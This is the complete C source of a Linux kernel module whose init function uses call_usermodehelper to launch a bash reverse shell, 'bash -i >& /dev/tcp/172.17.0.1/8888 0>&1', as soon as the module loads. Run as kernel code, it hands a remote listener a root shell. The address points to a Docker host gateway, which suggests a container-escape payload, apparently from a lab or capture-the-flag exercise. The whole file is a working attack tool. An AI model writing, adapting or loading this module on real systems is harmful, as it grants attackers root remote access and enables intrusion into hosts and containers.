#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kmod.h>

static char command[] = "bash -i >& /dev/tcp/172.17.0.1/8888 0>&1";

char *argv[] = {
    "/bin/bash",
    "-c",    // flag make command run from option list
    command, // Reverse shell
    NULL     // End of the list
};
static char *envp[] = {
    "HOME=/",
    NULL // End of the list
};

static int __init connect_back_init(void)
{

    return call_usermodehelper(
        argv[0],      // execution path
        argv,         // arguments for process
        envp,         // environment for process
        UMH_WAIT_EXEC // don't wait for program return status
    );
}

static void __exit connect_back_exit(void)
{
    printk(KERN_INFO "Exiting\n");
}

module_init(connect_back_init);
module_exit(connect_back_exit);